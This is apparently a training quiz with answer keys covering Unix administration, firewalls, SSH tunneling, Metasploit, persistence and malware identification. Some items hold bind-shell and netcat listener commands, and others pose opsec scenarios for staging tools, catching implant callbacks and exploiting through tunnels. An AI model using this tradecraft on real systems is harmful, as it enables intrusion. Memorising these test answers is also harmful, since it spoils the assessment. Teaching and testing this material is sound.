# Questions

## Unix

### Unix Shells and Scripting

1. How would you view the manual page for SSH? `man ssh`

2. What is the standard shell that most other shell versions are based off of? `Bourne Shell`

3. What is root's default shell for FreeBSD? `tcsh`

4. In one line, write a find command that: Finds all files on the machine named "config" using case insensitive search and redirects STDERR to /dev/null. `find / -iname config 2>/dev/null`

5. What symbol is used to redirect STDOUT and STDERR to the same place? `>&`

6. Write a command that will count the number of lines in /etc/passwd and write the result to /tmp/lines. `wc -l /etc/passwd > /tmp/lines`

7. On one line write two commands that will assign the value /bin/bash to a variable called myshell and then print the value of myshell. `myshell=/bin/bash; echo $myshell`

8. Write a command that will promote the variable myshell to an environment variable and reassign the value to /bin/sh. `export myshell=/bin/sh`

9. What should be the first line in a bash script? `#!/bin/bash`

### Unix Filesystems

1. Which directory stores critical system and configuration files? `/etc`

2. Where is the file that contains the OS kernel usually located? `/boot`


3. Which directory contains on-line manual pages? `/usr/share/man`

4. Which of the following are stored as regular files?

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

    A. Links

    B. Sockets

    `C. Executables`

    `D. Configuration Files`

    E. Device Files

    `F. Text Files`

    `G. Libraries`

5. A link that has the same inode number as the original file is a:
Format: Multiple Choice, Letter only
`A. Hard Link`
B. Symbolic Link

6. (T/F) Hard links can be used across filesystems, while soft links cannot. `False`

7. Write a command that will create a symbolic link named /tmp/log to /var/log/secure. `ln -s /var/log/secure /tmp/log`

8. Which of the following correctly describes a partition?

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

    A. System that aggregates physical devices to form pools

    B. Determines where and how file contents are stored

    C. Is used to increase reliability by duplicating data across disks

    `D. Is a fixed-size subsection of a storage device`

    `E. Has its own device file`

9. (T/F) RAID can increase the amount of storage space available for a device. `False`

10. It can be beneficial to put which of the following directories on a secondary partition?

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

    A. /var/log

    `B. /tmp`

    C. /root

    `D. /var`

    E. /etc

11. Which partitioning scheme is preferred for newer devices? `GPT` (GUID Partition Table)

### Unix Users and Permissions

1. What file defines groups in most Unix systems? `/etc/group`

    For assistance in completing this challenge refer to pages 244-252 in the UNIX and Linux System Administration Handbook 5th Edition.

2. On Linux, if you create a normal user, their UID will typically be higher than what number? `1000`

    For assistance in completing this challenge refer to pages 244-252 in the UNIX and Linux System Administration Handbook 5th Edition.

3. What would be the octal value equivalent of a file that has the following permissions (-rwx--x-w-): `712`

    For assistance in completing this challenge refer to pages 132-139 in the UNIX and Linux System Administration Handbook 5th Edition.

4. Using mnemonic syntax, provide the chmod command to add the following permissions to the file /myfile: `chmod u+rwx,g+rw,o+x`

    Owner: rwx
    Group:rw
    Other:x

5. The parent of a currently running process dies. What is the new parent of this process? `init`
     
     For assistance in completing this challenge refer to pages 92-94 in the UNIX and Linux System Administration Handbook 5th Edition.

### Unix Networking and Name Resolution

1. In regards to `/etc/resolv.conf`, what keyword deteremines the domain(s) to be queried if the hostname is not fully qualified? `search`

    For assistance in completing this challenge refer to pages 500-502 in the UNIX and Linux System Administration Handbook 5th Edition.


2. For assistance in completing this challenge refer to pages 500-502 in the UNIX and Linux System Administration Handbook 5th Edition. `files`

    In regards to /etc/nsswitch.conf, what keyword refers to querying the /etc/hosts file for name resolution?

3. For assistance in completing this challenge refer to pages 500-502 in the UNIX and Linux System Administration Handbook 5th Edition.

    The following is an entry in /etc/nsswitch.conf

	hosts: dns [!UNAVAIL=return] files
    Assuming this the only entry in the file concerning name resolution, will /etc/hosts be referenced if DNS lookup fails? 

    Answer with either True or `False`

4. What arguments for the netstat command will display the routing table without resolving host names, port numbers, and user names? `-rn`

    Refer to the manpage of netstat for assistance in answering this challenge. One place you can look is (https://linux.die.net/man/8/netstat) 

5. Refer to the manpage of netstat for assistance in answering this challenge. One place you can look is here (https://linux.die.net/man/8/netstat).  `-pantu`

    Provide the correct options for netstat that will perform the following:

    Show the PID of the program for each socket

    Show listening and non-listening ports

    Does not resolve hostnames,ports, or usernames

    Shows TCP connections

    Show UDP connections

    Provide you answer ordering options 1-5 from left to right. For example if the answer to 1 
    was -a and the answer to 2 was -b, etc, you answer will be -abcde

6. If the system you run netstat on attempted to initiate a connection but has not yet received a response, what state is the connection most likely listed as?  `SYN_SENT`

    To answer this challenge, you may refer to this page(https://www.supportsages.com/understanding-the-netstat-command/).

7.  This system is listening on tcp for what 3 network services? Separate each answer with commas, no spaces, and in alphabetical order. Use acronyms or abbreviated names of the services to get marked correct. `DNS,ipp,MySQL`

    To answer this challenge, refer to the attached netstat output and a listing of common UNIX ports such as this one.

8. What is the most popular implementation of DNS? `BIND`

    For assistance in completing this challenge refer to pages 498-500 in the UNIX and Linux System Administration Handbook 5th Edition.


9. Which version of NFS removed the need for the lockd and statd daemon? `4`

    For assistance in completing this challenge refer to pages 791-798 in the UNIX and Linux System Administration Handbook 5th Edition.


### Unix Firewalls 1

1. What is the default iptables table? `filter`

2. Which default iptables chain do packets pass through when they need to be forwarded to a different interface? `forward`

3. Which default iptables table can be used to circumvent kernel connection tracking? `raw`

4. An Ubuntu redirector has correct iptables rules configured to forward traffic to a target machine, however no packets are forwarded. Use the cat command to check the value of a kernel variable to see if ipv4 forwarding is enabled. `cat /proc/sys/net/ipv4/ip_forward`

5. An Ubuntu redirector has correct iptables rules configured to forward traffic to a target machine, however no packets are forwarded. We have discovered that it does not have routing enabled. Use the sysctl command to temporarily enable forwarding. `sysctl -w net.ipv4.ip_forward=1`

6. Write an iptables command that will set the default policy of the input chain to drop all packets. `iptables -P INPUT DROP`

7. Write an iptables command that will add a rule to log all packets received on eth0 that are destined for this machine. `iptables -A INPUT -i eth0 -j LOG`

    `Format`: iptables -option chain -option interface -option target

8. Write an iptables command that will add a rule to accept packets with any protocol that are destined for this device on eth1. `iptables -A INPUT -i eth1 -p ANY -j ACCEPT`

    `Format`: iptables -option chain -option interface -option proto -option target

9. Write an iptables command to add a rule that will allow any incoming TCP packets destined for the machine that are part of an ESTABLISHED or RELATED connection. `iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT`

    `Format`: iptables -option chain -option proto -option match --state STATE,STATE -option target

10. Write a command to view the ipfilter active filtering rule set. `ipfstat -io`

11. Write a command to flush the existing ipfilter ruleset, and load a set of rules from /tmp/ipf/ipf.conf. `ipf -Fa -f /tmp/ipf/ipf.conf`

12. Based on the attached ipf.conf file, incoming packets from which of the following IP addresses would be blocked?

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

    `A. 10.1.254.12`

    B. 192.168.1.2

    `C. 210.18.28.10`

    `D. 192.168.1.12`

    E. 210.18.33.253

13. Based on the attached ipf.conf file, incoming TCP packets from 192.168.1.14 would be allowed to which of the following ports? Assume all packets are from a new connection.

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

    `A. 22`

    B. 53

    `C. 80`

    `D. 111`

    `E. 443`

    F. 1337

    `G. 8080`

14. A router has made a decision to forward a packet. What is the next iptables table that will process the packet?

    Format: Multiple choice, single letter

    A. Forward

    B. Filter

    C. NAT

    D. Output

    `E. Mangle`

    F. Raw

### Unix Processes

1. What identification number determines the resources a process has access to at a given moment? `EUID`

2. Which processes has the highest priority in CPU time?

    A. Process with a niceness of 0 

    `B. Process with a niceness of -10` 

    C. Process with a niceness of 10

3. Which of the following signals cannot be blocked and is processed at the kernel level?

    A. TERM 
    
    B. QUIT 
    
    C. INT 
    
    `D. KILL`

4. What command should be used to guarantee that the following process will die? `kill -9`

    USER PID COMMAND

    root 1023 nc -nlvp 1234 -e /bin/bash

5. Where in the /proc filesystem would you find the symbolic link to the file being executing for the following process? `/proc/1023/exe`

    PID USER COMMAND 1023 root nc -nlvp 5050 -e /bin/bash

    Enter absolute path

6. What command is used to follow the system calls made by a given process in Linux? `strace`

7. Write the crontab entry for running the command /usr/bin/nc -lp 1234 every Monday at 0800. `0 8 * * 1 /usr/bin/nc -lp 1234`

    FORMAT: Each field separated by a space

    e.g.,

    * * * * * echo $(date) >> ~/date.log

8. Which of the following methods can be used to investigate a suspicious process with a PID of 5435

    `A. ps -ef | grep 5435`

    `B. netstat -pant | grep 5435`

    `C. ls -l /proc/5435`

    `D. strace -p 5435`

9. Based on the attached process list, write a pkill command that will send a TERM signal to the children of the script.sh process. Use the PID of the specified process. `pkill -15 -P 13635`

### Unix Logging 1

1. What are the major subtasks of log management? 

    `A. Collecting logs from a variety of sources`

    `B. Providing a structured interface for querying, analyzing, filtering, and monitoring messages`

    `C. Managing the retention and expiration of messages`

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

2. What role does Unix's syslog play in log management?

    `A. Collecting logs from a variety of sources`

    B. Providing a structured interface for querying, analyzing, filtering, and monitoring messages

    C. Managing the retention and expiration of messages

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

3. What role does Linux's systemd journal play in log management?

    `A. Collecting logs from a variety of sources`

    `B. Providing a structured interface for querying, analyzing, filtering, and monitoring messages`

    `C. Managing the retention and expiration of messages`

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

4. What is the usual default path in Unix for storing log files? `/var/log`

5. Where are private authorization messages logged, including authentication and ssh login attempts? `/var/log/secure`

6. What log file does the last command interact with to display the record of user login/logout and system reboot information? `/var/log/wtmp`

7. What log file does the lastlog command interact with to display the record of most recent logins of users? `/var/log/lastlog`

8. What is the command to view the last 5 entries of journal logs created by the cron service? `journalctl -u cron -n 5`

9. What is the command to view all journal entries from the date 2021-08-01 to 2021-08-07? `journalctl --since=2021-08-01 --until=2021-08-07`

    FORMAT: command --option=value --option=value

10. Where is the default configuration file for systemd journal stored? `/etc/systemd/journald.conf`

11. In what directory custom configuration files for systemd journal stored? `/etc/systemd/journal.conf.d`

12. Where is the default location for the rsyslog's configuration file? `/etc/rsyslog.conf`

13. (T/F) Unlike systemd journal, syslog acts as a message router by, (1) taking input from various plug-ins, (2) filtering them according to its rules, and (3) outputting them to their destinations. `T`

14. What is the correct syntax to log all sensitive/private authorization message to /var/log/secure? `authpriv.* /var/log/secure`

    FORMAT: [selector]space[action]

15. What is the correct syntax to log all crit severity level messages (excluding other severity levels) to /var/log/crit? `*.=crit /var/log/crit`

    FORMAT: [selector]space[action]

16. What is the correct syntax to forward mail-related messages at priorities notice, warning, and crit to IP address 192.168.10.10 on TCP port 514? `mail.=notice;mail.=warning;mail.=crit @@192.168.10.10`

    FORMAT: [selector]space[action]

### Unix Boot and Login

1. What is the first step in the boot process after the machine is powered on?

    A. Load boot loader

    B. Load system kernel

    `C. Load BIOS/UEFI`

2. Match the following descriptions to the corresponding firmware: `U,U,B,B,U,U`

    FORMAT: comma separated list (e.g., B,U,U,B,B)

    B: BIOS U: UEFI

    More modern standard of PC firmware
    Uses a disk partitioning scheme known as GPT (GUID Partition Table)
    Assumes boot device starts with the MBR (Master Boot Record)
    Requires execution of second-stage boot loader
    Defines APIs for accessing system hardware
    Consults its partition table to identify the ESP

3. What sector of a storage device contains the code responsible for reading the partitioning information from the MBR and executing the second-stage boot loader?  `volume boot record`

4. What is the boot loader's main function?

    A. Consult the MBR for the location of the boot block 
    `B. Identity and load the OS kernel` 
    C. Start the initial process (init) D. Mount the root file system

5. What is the absolute path to the GRUB config file in Red Hat and CentOS? `/boot/grub2/grub.cfg`

6. What is the boot loader for FreeBSD known as? `loader`


7. From which file is the grub.cfg generated? `/etc/default/grub`

8. What is the kernel boot time option to use /dev/sda1 as the root file system? `root=/dev/sda1`

9. What is the name of the system management daemon with a process ID of 1, and is the parent process for all other processes? `init`

10. What are some of the core responsibilities of init?

    `A. Mount filesystems` 
    `B. Configure network interfaces`
    `C. Start up other daemons and services`
    D. Execute initial user log in scripts

    FORMAT: comma separated list (e.g., A,C,D)

11. What term associated with` systemd` is analogous to traditional init's runlevel , which defines the operational mode of the system? `target`

12. What is the command that is used to manage and check the status of the configurations of systemd units? `systemctl`

### Unix Kernel Basics

1. Which of the following are classified as UNIX operating systems? `B,C,E`

2. The kernel provides which of the following functions?

    `A. Communication with processes and threads`

    B. Runs user applications

    `C. Provides memory management`

    `D. Management of hardware devices`

    E. None of the above

3. (T/F) Many kernel parameters can accessed from user mode to change the behavior of the kernel. `T`

4. (T/F) User processes have access to all of a system's memory space. `F`

5. Which of the following statements correctly describe User Space?

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

    `A. It is a form of sandbox to prevent system damage.`

    B. Core OS functions usually run in user space.

    C. When a process malfunctions within user space it will often crash the entire system.

    D. User applications run in protection ring 1.

    `E. User space processes interact with the kernel through system calls.`

6. What directory contains file objects that can be used to tune kernel parameters during runtime?  `/proc/sys`

7. What file can be used with the sysctl command to permanently set parameter configurations?  /`etc/sysctl.conf`

8. Write an echo command that will temporarily set the "panic_on_oops" parameter to 3. `echo 3 > /proc/sys/kernel/panic_on_oops`

9. Write a sysctl command that will display all kernel parameter values. `sysctl -a`

10. Which of the following statements do not correctly describe Linux kernel modules?

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

    A. Kernel modules allow a driver to be linked in while the kernel is running.

    B. Almost anything can be built as a loadable kernel module.

    `C. Loading a kernel module can never cause a kernel panic.`

    `D. The implementation of loadable modules is the same for every OS.`

11. Write a modprobe command to list the dependencies of the ip_tables module. Assume you are root. `modprobe -D ip_tables`

## Networking

### File Transfer

1. What python module can be used in a one-liner to quickly spin up an HTTP server for hosting files? `SimpleHTTPServer module`

2. What command line flag is used to recursively transfer directories using SCP? `-r`

3. Provide a netcat command to listen on port 8080 for a file, and write to a file named recv.txt `nc -l -p 8080 > recv.txt`

4. Provide a windows cmd.exe (no powershell) command to base64 encode loot.dmp and output results to loot.b64 `certutil -encode loot.dmp loot.b64`

5. Decode the following base64 string to get the flag: MWZmYzQyNDA0ODUyMjIzYTg2NDgzZDYzYjc2ZTUyYjUzZGEwZjJlNA== `1ffc42404852223a86483d63b76e52b53da0f2e4`

    Try out different methods to get familiar with them. Websites are great but may not be available on mission, so try command line utilities. Python is also good practice.

6. You have just landed on a target and need to transfer your tools via a separate channel. Your target is a workstation that is NATed behind a firewall with inbound rules. Which method is the better option for file transfer for both feasibility and opsec? The flag will be either A or B, letter only.

    A. Try to mount an SMB share on the target from your ops station and copy your tools over.

    `B. Host a file on an apache server on your ops station and download it to the target using wget.`

7. Consider the following scenario and decide if it is better to push or pull your tools to the target.

    You have just landed on a target web server. After performing initial survey, you would like to upload your toolset. You have noticed that this web server rarely initiates outbound connections except for receiving updates, resolving DNS, and time synchronization. You have also noticed that ports 80, 443, 8000, 8443 are accessible from the internet on the target. Which file transfer strategy is more likely to succeed and blend in? Assume all tools in the options are available. Answer with A or B, letter only.

    A. Set up a local HTTP server on port 80 of your ops station and pull your tools to the target using wget.

    `B. Set up a netcat listener on the target on port 8000 (currently open) and push your tools to the target using netcat`

### Socket Programming

1. What are the two components to a socket? Answer like: component and component `IP and Port`

2. Which parameter below is used in Python socket object creation to specify the socket as TCP? Answer with the letter only.

    A. socket.AF_INET
    `B. socket.SOCK_STREAM`
    C. socket.SOCK_DGRAM
    D. socket.SOCK_RAW

3. Which parameter below is used in Python socket object creation to specify the socket as UDP? Answer with the letter only.

    `A. socket.SOCK_DGRAM`
    B. socket.SOCK_RAW
    C. socket.SOCK_STREAM
    D. socket.AF_INET

4. Which parameter below is used in Python socket object creation to specify a raw socket? Answer with the letter only.

    A. socket.SOCK_STREAM
    `B. socket.SOCK_RAW`
    C. socket.AF_INET
    D. socket.SOCK_DGRAM

5. What attribute needs to be set to specify an interface in scapy? `iface`

### Routers, Firewalls, and the Internet

1. What type of firewall does an Access Control List in Cisco IOS provide? `Packet Filtering`

2. What type of router has links to more than one AS? `Autonomous System Boundary Router`

3. What Regional Internet Registry (RIR) is responsible for assignment of IP addresses in South Korea? `APNIC`

4. Fill in the blank: With an increase of devices on the internet, the available ____________ addresses have been running out. NAT is used to help with this problem until IPv6 is commonly implemented. `ipv4`

5. Fill in the blank: Network Address Port Translation (NAPT) uses the _____________ port to multiplex multiple inside IPs through one outside IP. `source`

6. What type of firewall can use TCP connection state in its rules? `stateful` 

7. In the provided Cisco IOS config, what is the hostname of the device? `retail`

### Non SSH Redirection

1. (T/F) Metasploit routing can only handle TCP traffic. `T`

2. You reach a nix system in the middle of your op via an SSH connection that does not have an ssh client installed, what discussed tool could you bring over to continue transitioning through this network? `socat`

3. Given this fpipe command, what sort of traffic is probably being routed? (answer with just the protocol name) `ssh`

    fpipe.exe -l 22022 -r 22 192.168.100.2

4. You come across a log file of commands on a DMZ machine with this socat command: `smb`

    socat TCP:LISTEN:22139 TCP:192.168.117.47:139

    What service might this command have been set up to allow an outside entity to exploit? (answer with just the service type)

5. You have accessed a windows machine via ssh partway though your op plan. Unfortunatly the windows firewall is blocking incoming ssh, and you are not allowed to modify the firewall. Thankfully port 5000 is open. `fpipe.exe -l 5000 -r 22 192.168.100.80`

    What command would allow you, assuming you brought over a tool that has been discussed, to connect your ssh cilent though this windows machine to 192.168.100.80:22? (assume you are in the same directory as your tool when the command is run)

### Forward SSH Tunneling

1.  An SSH tunnel is configured from machine A through machine B to machine C to channel telnet traffic. At which point can the traffic be captured unencrypted? Answer with the letter.

            A                   B                     C
            --------------      --------------      --------------
            |            |      |            |      |            |
            |        8080>====================------>80          |
            |            |      |            |      |            |
            --------------      --------------      --------------

    A. On the wire between machine A and B (assume you can collect the traffic)   
    `B. On the wire between machine B and C (assume you can collect the traffic)`    
    C. Via TcpDump port 22 on machine B    
    D. Via TcpDump port 8080 on machine A   

2. Provide the command line option to configure a forward SSH tunnel listening on localhost port 8080 to 10.0.0.8 port 80, through an SSH session on 172.16.0.5 port 22. Use IP addresses and not hostnames. Provide only the command line option for the tunnel in format: `-L 8080:10.0.0.8:80`

    `-<FLAG> <ARGUMENTS>`

3. Provide the ssh command to configure a forward SSH tunnel. This configuration should allow other ops network machines to connect to your ops station to use the tunnel. Your ops station IP address is 172.16.0.4 and the listening port should be 1022. The tunnel should point to 192.168.10.10 port 22. The tunnel should go through an SSH session on 172.16.0.5 port 22. `ssh -p 22 user1@172.16.0.5 -L 172.16.0.4:1022:192.168.10.10:22`

    The credentials to 172.16.0.5 are user1/pass1 and the credentials to 192.168.10.10 are user2/pass2. Use IP addresses and not hostnames. Provide the command line for the tunnel in format:

    `ssh -p <ARG> <user>@<IP> -<FLAG> <ARGS>`

4. A forward SSH tunnel has already been configured as specified below. Provide the ssh command to connect to 172.16.0.4 through the tunnel. The tunnel was configured with the following command: `ssh -p 1022 user2@127.0.0.1`

    `ssh -p 22 user1@192.168.10.10 -L 127.0.0.1:1022:172.16.0.4:22`

        192.168.10.9        192.168.10.10       172.16.0.4
        --------------      --------------      --------------
        |            |      |            |      |            |
        |            ------->22          |      |            |
        |        1022>====================------>22          |
        |            |      |            |      |            |
        --------------      --------------      --------------
                            user1               user2
                            pass1               pass2

    Provide the SSH command in the format:

    `ssh -p <ARG> <user>@<IP>`

### Reverse SSH Tunneling

1. A reverse SSH tunnel is configured as described in the diagram below using the following command on machine A:

    `ssh -p 22 user1@B -R 8080:127.0.0.1:80`

        A                   B                   C
        --------------      --------------      --------------
        |            |      |            |      |            |
        |            ------->            |      |            |
        |            <===================<-------            |
        |            |      |            |      |            |
        --------------      --------------      --------------

    On which machine will the tunnel listening port 8080 be listening on? Answer with the letter only. `B`

2. A reverse SSH tunnel is configured as described in the diagram below using the following command on machine A:

    `ssh -p 22 user1@B -R 8080:127.0.0.1:80`

        A                   B                   C
        --------------      --------------      --------------
        |            |      |            |      |            |
        |            ------->            |      |            |
        |            <===================<-------            |
        |            |      |            |      |            |
        --------------      --------------      --------------

    To which machine will the tunnel try to communicate with on port 80? Answer with the letter only.

3. Provide the reverse tunnel option and argument to catch a callback on the remote machine on port 8000 and send the callback from the tunnel to a local netcat listener on port 1337. The callback is coming from a separate remote machine, so the remote listener must be listening globally. You may assume that the remote machine allows reverse tunnels and the default is to listen globally. Please provide the option and argument in the following format, using IP addresses and not hostnames: `-R 8000:127.0.0.1:1337`

    Callback, remote machine : 8000

    `-<OPT> <ARG>`

4. An implanted machine is calling back to a redirector at 192.168.5.164 on port 8080. You need to connect to this redirector via SSH on port 2222 as user1 and set up a reverse SSH tunnel that will send this redirector from your ops station to a beacon collector at 172.16.2.10 on port 4443. Provide the full SSH command to catch this redirector and send to the collector. You may assume the redirector can perform reverse tunneling and that the default is to listen globally. Provide the command in the following format:

    `ssh -p 2222 user1@192.168.5.164 -R 8080:172.16.2.10:4443`

    Redirector : 192.168.5.164
        Port : 8080
    Connection Port: 2222
    Beacon Collector : 172.16.2.10
        Port : 4443

        Ops Station          Redirector (192.168.5.164) Beacon Collector (172.16.2.10)        
        --------------      --------------          --------------
        |            |      |  User1     |          |            |
        |            -------> 2222       |          |            |
        |   8080     <===================<------- 4443           |
        |            |      |            |          |            |
        --------------      --------------          --------------

    `ssh -p <ARG> <user>@<IP> -<OPT> <ARGS>`

5. Reference the attached output from TcpDump on your redirector. Another operator has implanted a target and has set it to call back via TCP to your redirector, however they did not include the callback port in the op notes. You have been tasked to configure a reverse SSH tunnel to catch the callback and forward it to a collector on your ops station. Based on the TcpDump output, what port should you configure the reverse tunnel to listen on? `8008`

### Network Troubleshooting

1. One bit in a mac address determines if an address is unicast or multicast. Given the BPF ether[0xNN]=1, what digits should replace NN to determine if the packet is multicast? `01`

2. Analyze the following IP packet. Enter answers in the order they are asked separated by a comma.

    `45 00 00 34 c2 ce 40 00 80 06 00 00 7f 00 00 01 7f 00 00 01 d7 c5 26 e3 03 e7 5b 6a 00 00 00 00 80 02 ff ff 18 f0 00 00 02 04 ff d7 01 03 03 08 01 01 04 02`

    Questions:
    What transport layer protocol is in use? `TCP`
    What is the destination port? `9955`

3. Use the packet below to answer the following questions. This is part of the same packet exchange as in question 1. Enter answers in the order they are asked separated by a comma.

    `45 00 02 dd c2 d4 40 00 80 06 00 00 7f 00 00 01 7f 00 00 01 d7 c5 26 e3 03 e7 5b 6b 8e b4 fb f3 50 18 27 f9 0d 84 00 00 47 45 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 31 32 37 2e 30 2e 30 2e 31 3a 39 39 35 35 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e 3a 20 6b 65 65 70 2d 61 6c 69 76 65 0d 0a 43 61 63 68 65 2d 43 6f 6e 74 72 6f 6c 3a 20 6d 61 78 2d 61 67 65 3d 30 0d 0a 73 65 63 2d 63 68 2d 75 61 3a 20 22 20 4e 6f 74 20 41 3b 42 72 61 6e 64 22 3b 76 3d 22 39 39 22 2c 20 22 43 68 72 6f 6d 69 75 6d 22 3b 76 3d 22 39 36 22 2c 20 22 4d 69 63 72 6f 73 6f 66 74 20 45 64 67 65 22 3b 76 3d 22 39 36 22 0d 0a 73 65 63 2d 63 68 2d 75 61 2d 6d 6f 62 69 6c 65 3a 20 3f 30 0d 0a 73 65 63 2d 63 68 2d 75 61 2d 70 6c 61 74 66 6f 72 6d 3a 20 22 57 69 6e 64 6f 77 73 22 0d 0a 55 70 67 72 61 64 65 2d 49 6e 73 65 63 75 72 65 2d 52 65 71 75 65 73 74 73 3a 20 31 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 57 69 6e 64 6f 77 73 20 4e 54 20 31 30 2e 30 3b 20 57 69 6e 36 34 3b 20 78 36 34 29 20 41 70 70 6c 65 57 65 62 4b 69 74 2f 35 33 37 2e 33 36 20 28 4b 48 54 4d 4c 2c 20 6c 69 6b 65 20 47 65 63 6b 6f 29 20 43 68 72 6f 6d 65 2f 39 36 2e 30 2e 34 36 36 34 2e 35 35 20 53 61 66 61 72 69 2f 35 33 37 2e 33 36 20 45 64 67 2f 39 36 2e 30 2e 31 30 35 34 2e 34 33 0d 0a 41 63 63 65 70 74 3a 20 74 65 78 74 2f 68 74 6d 6c 2c 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78 68 74 6d 6c 2b 78 6d 6c 2c 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78 6d 6c 3b 71 3d 30 2e 39 2c 69 6d 61 67 65 2f 77 65 62 70 2c 69 6d 61 67 65 2f 61 70 6e 67 2c 2a 2f 2a 3b 71 3d 30 2e 38 2c 61 70 70 6c 69 63 61 74 69 6f 6e 2f 73 69 67 6e 65 64 2d 65 78 63 68 61 6e 67 65 3b 76 3d 62 33 3b 71 3d 30 2e 39 0d 0a 53 65 63 2d 46 65 74 63 68 2d 53 69 74 65 3a 20 6e 6f 6e 65 0d 0a 53 65 63 2d 46 65 74 63 68 2d 4d 6f 64 65 3a 20 6e 61 76 69 67 61 74 65 0d 0a 53 65 63 2d 46 65 74 63 68 2d 55 73 65 72 3a 20 3f 31 0d 0a 53 65 63 2d 46 65 74 63 68 2d 44 65 73 74 3a 20 64 6f 63 75 6d 65 6e 74 0d 0a 41 63 63 65 70 74 2d 45 6e 63 6f 64 69 6e 67 3a 20 67 7a 69 70 2c 20 64 65 66 6c 61 74 65 2c 20 62 72 0d 0a 41 63 63 65 70 74 2d 4c 61 6e 67 75 61 67 65 3a 20 65 6e 2d 55 53 2c 65 6e 3b 71 3d 30 2e 39 0d 0a 0d 0a`

    Questions:

    What is the source port for the packet? `55237`
    What application-layer protocol is being used in this packet? `HTTP`
    What is the default port for this protocol?

4. tcpdump can compile BPFs. Examine the following compiled filter. Then answer the questions in order, separated by a comma. `IP,UDP`

    (000) ldh [12]
    (001) jeq #0x800 jt 2 jf 5
    (002) ldb [23]
    (003) jeq #0x11 jt 4 jf 5
    (004) ret #65535
    (005) ret #0

    Questions:

    What network layer protocol does the filter accept?
    What transport layer protocol does the filter accept?

## Security Concepts

### Security Products

1. Linux operating systems maintain access control via Discretionary Access Control (DAC) by default. What type of access control does SELinux enable? Enter either the full term or acronym. `MAC`

2. What was the built-in antivirus that shipped with Windows 7? `Microsoft Security Essentials`

3. Of the following choices, where is the best choice to place an IDS? Answer with the letter only.

    A. Directly before your firewall on the outside of your network 
    `B. Directly before your firewall on the inside of your network`
    C. At each switch to capture all inter-host traffic in your network

### Metasploit

1. When using Kali Linux, where is the default path for metasploit usually located? `/usr/share/metasploit-framework`

2. T/F In the scope of the the penetration testing lifecycle, are auxiliary modules nothing more than small pieces of code designed to do a specific task? `T`

3. Based on the reading, how many factors go into selecting the proper exploit for the target? (1, 2, 3.. etc) `4`

4. What module type in metasploit deals with obfuscation of attacks? `Encoders`

5. What command in the Metasploit Framework functions like netcat? `Connect`

6. What command in MSF is used to add, view, modify, or delete network routes? `route`

7. If you want to set a global variable in MSF what command would you use? `setg`

8. If you wanted to specifically retrieve the contents of a local variable in MSF, such as RHOST, what command would you use? `get`

### Exploitation Through Tunnels

1. T/F A reason to exploit though an SSH tunnel would be to attribute the attack to yourself. `f`

2. When using metasploit to exploit a remote target whose IP address is 103.137.58.28 on port 137 that is at the end of an SSH forward tunnel you have set up to have a local port of 13701 on your ops station, what should the RPORT and RHOST of your exploit in MSF be? (answer in this format- RHOST:RPORT) `127.0.0.1:13701`

3. Your op plan calls for you to trigger an implant that has been placed on a target machine which is designed to reach out to the IP address of the target network DMZ server. You have already established your reverse tunnel from the DMZ on port 1337 to your local machine on 13370. When you trigger the implant, what port should your handler be listening on? `13370`

4. You have set up a last hop SSH tunnel using this command: ssh -p 3333 badguy@127.0.0.1 -L 4444:192.168.19.38:5600

    When running an exploit through MSF, what should your RPORT and and RHOST be? (answer in this format- RHOST:RPORT) `127.0.0.1:4444`

5. (T/F) Alongside SSH tunneling, metasploit can be used for privlage escalation via a target hosts internal ports. `T`

6. (T/F) If triggering an implant that calls out to a specific port on your last hop machine, you do not need to route that traffic back to metasploit through a reverse tunnel and catch it with a handler. Metasploit will take care of that itself. `F`

### Shellcode, Backdoors, and Code Injection

1. The XOR operation is used when writing shellcode in order to remove what hex character from the actual executed code? (A,B,C..0,1,2, ect ) `0`

2. When your exploit needs more memory space to execute than is available in the process, what type of shellcode is used to download more code in chunks to make sure the full attack is completed? `staged`

3. You have accessed a target windows machine through rdesktop, you notice a brief flash of a command prompt window when you open a text document. When you check the netstat information after, you notice that there is a new netcat connection to an unknown IP. What sort of persistance method is this most likely? `Abusing Default File Associations`

    `https://www.cynet.com/attack-techniques-hands-on/the-art-of-persistence/`

4. On a linux target machine, you notice that every time you logon to bash a new connection to an unknown IP occurs. What file might cause this action? `.bashrc`

5. You have triaged a persistance mechanisim on a linux host which waits for a specific series of ports to be sent a syn packet before opening a shell on port 1337. This is acomplished by a script run through the root crontab. What permission level does the spawned shell have? `root`

6. What sort of attack will execute code when an unsuspecting user visits that web page? `Cross Site Scripting`

7. What sort of attack leverages only knowledge of the underlying operating system behind a web application in order to execute code? This attack also requires manipulation of input to the web application. `Command injection`

8. (T/F) Logging of code injection attacks is not a concern. `F`

9. When attempting to perform command injection on a linux based webapp, you notice most commands you normally have access to do not seem to exist, and the directory structure seems very sparse and non standard. However you do seem to have the ability to interact with the OS. What security method may be stopping your attack efforts? `chroot`

### Malware, Botnets, and Rootkits

1. You are sniffing traffic on your network and see an overwhelming amount of TCP-SYN segments from different IP addresses targeting your external-facing web server. What type of attack is this? `ddos`

2. You are looking at a process list on a linux box. You see that a process called "/usr/bin/itune" has spawned a child process titled "/bin/nc -lvp 1337." What type of malware is "/usr/bin/itune"? `trojan`

3. You see that process A is writing to a file. You open that file, and see text, such as:

        username
        password
        date -u
        whoami
        ps -eof

    What kind of malware is program A? `keylogger`

4. What sort of malware hides itself, and as a result, is the hardest to detect? `rootkit`

5. You identify a process as suspicious. When looking further into this process, you notice that it spawns a copy of itself. This copy is then transfered to other hosts on the network via ftp. What sort of malware is at play? `worm`

